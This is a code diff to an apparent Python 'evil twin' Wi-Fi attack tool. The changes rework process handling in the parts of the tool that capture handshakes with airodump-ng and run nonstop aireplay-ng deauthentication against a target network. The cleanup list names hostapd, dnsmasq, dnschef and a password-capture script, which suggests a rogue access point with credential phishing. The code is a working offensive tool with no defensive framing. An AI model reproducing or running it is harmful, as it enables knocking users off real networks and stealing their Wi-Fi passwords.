@@ -67,11 +67,6 @@ class AttackConfig:
     selected_interface: str = ""
     routing_table: str = ""
     
-    # Process IDs for cleanup
-    deauth_pid: Optional[int] = None
-    airodump_pid: Optional[int] = None
-    client_check_process: Optional[subprocess.Popen] = None
-    
     # Flags
     handshake_captured: bool = False
     monitor_mode_already: bool = False
@@ -100,8 +95,7 @@ class EvilTwinAttack:
         
         # Clean /tmp files
         tmp_dir = Path('/tmp')
-        patterns = ['client_check*', 'scan*', 'handshake_check*', 'airodump.log', 'deauth.log', 
-                   'hostapd.log', 'dnsmasq.log', 'dnschef.log', 'evil_twin_debug.log']
+        patterns = ['client_check*', 'scan*', 'handshake_check*', 'hostapd.log', 'dnsmasq.log', 'dnschef.log', 'evil_twin_debug.log']
         for pattern in patterns:
             for f in tmp_dir.glob(pattern):
                 try:
@@ -351,7 +345,7 @@ class EvilTwinAttack:
         logger.setLevel(old_level)
         return True
     
-    def check_for_clients(self, bssid: str, channel: str, timeout: int = 15) -> int:
+    def check_for_clients(self, bssid: str, channel: str, timeout: int = 30) -> int:
         """Check if target network has any clients"""
         log_info(f"Checking for clients on {bssid} (channel {channel}) for {timeout} seconds...")
         
@@ -367,14 +361,13 @@ class EvilTwinAttack:
         # Start airodump-ng in background
         cmd = f"airodump-ng -c {channel} --bssid {bssid} -w /tmp/client_check {self.config.mon_interface}"
         
-        self.config.client_check_process = subprocess.Popen(
+        subprocess.Popen(
             cmd, shell=True,
             stdin=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
         
-        log_debug(f"Started airodump for client check, PID: {self.config.client_check_process.pid}")
         
         # Countdown with visual feedback
         for i in range(timeout):
@@ -384,10 +377,8 @@ class EvilTwinAttack:
         print()
         
         # Kill airodump
-        if self.config.client_check_process:
-            self.config.client_check_process.terminate()
-            time.sleep(2)
-            self.config.client_check_process = None
+        self.run_command("pkill -9 airodump-ng 2>/dev/null")
+        time.sleep(2)
         
         # Parse results
         client_count = 0
@@ -563,26 +554,22 @@ class EvilTwinAttack:
         
         # Start airodump-ng
         log_debug("Starting airodump-ng...")
-        with open('/tmp/airodump.log', 'w') as f:
-            self.config.airodump_pid = subprocess.Popen(
-                f"nohup airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w evil {self.config.mon_interface} > /tmp/airodump.log 2>&1 &",
-                shell=True,
-                stdin=subprocess.DEVNULL
-            ).pid
+        subprocess.Popen(
+            f"nohup airodump-ng -c {self.config.target_channel} --bssid {self.config.target_bssid} -w evil {self.config.mon_interface} > /dev/null 2>&1 &",
+            shell=True,
+            stdin=subprocess.DEVNULL
+        )
         
-        log_debug(f"Airodump PID: {self.config.airodump_pid}")
         time.sleep(3)
         
         # Start aireplay-ng deauth
         log_debug("Starting aireplay-ng deauth...")
-        with open('/tmp/deauth.log', 'w') as f:
-            self.config.deauth_pid = subprocess.Popen(
-                f"nohup aireplay-ng -0 0 -a {self.config.target_bssid} {self.config.mon_interface} > /tmp/deauth.log 2>&1 &",
-                shell=True,
-                stdin=subprocess.DEVNULL
-            ).pid
+        subprocess.Popen(
+            f"nohup aireplay-ng -0 0 -a {self.config.target_bssid} {self.config.mon_interface} > /dev/null 2>&1 &",
+            shell=True,
+            stdin=subprocess.DEVNULL
+        )
         
-        log_debug(f"Deauth PID: {self.config.deauth_pid}")
         
         log_info("Deauth running - waiting for handshake (max 60 seconds)...")
         
@@ -603,6 +590,7 @@ class EvilTwinAttack:
                 if ret == 0:
                     log_success(f"Handshake captured at {i} seconds!")
                     handshake_captured = True
+                    self.run_command("pkill -9 airodump-ng 2>/dev/null")
                     break
                 
                 # Also check for EAPOL packets
@@ -612,6 +600,7 @@ class EvilTwinAttack:
                     if eapol_count >= 4:
                         log_success(f"Found {eapol_count} EAPOL packets - handshake captured!")
                         handshake_captured = True
+                        self.run_command("pkill -9 airodump-ng 2>/dev/null")
                         break
             
             if i % 5 == 0:
@@ -621,11 +610,8 @@ class EvilTwinAttack:
         print()
         
         # Kill processes
-        log_debug("Killing processes...")
-        if self.config.airodump_pid:
-            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
-        if self.config.deauth_pid:
-            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
+        log_debug("Killing airodump...")
+        self.run_command("pkill -9 airodump-ng 2>/dev/null")
         time.sleep(2)
         
         if handshake_captured:
@@ -1026,21 +1012,11 @@ class EvilTwinAttack:
         """Clean up all processes and restore settings"""
         log_info("Cleaning up...")
         
-        # Kill client check process if running
-        if self.config.client_check_process:
-            self.config.client_check_process.terminate()
-            log_debug("Terminated client check process")
-        
         # Kill processes
         processes = ['hostapd', 'dnsmasq', 'airodump-ng', 'aireplay-ng', 'dnschef', 'passapi.py', 'php']
         for proc in processes:
             self.run_command(f"pkill -f {proc} 2>/dev/null")
             log_debug(f"Killed {proc}")
-        
-        if self.config.deauth_pid:
-            self.run_command(f"kill {self.config.deauth_pid} 2>/dev/null")
-        if self.config.airodump_pid:
-            self.run_command(f"kill {self.config.airodump_pid} 2>/dev/null")
         
         # Remove virtual AP interface (only if it's virtual)
         if self.config.ap_interface and self.config.ap_base != self.config.ap_interface:
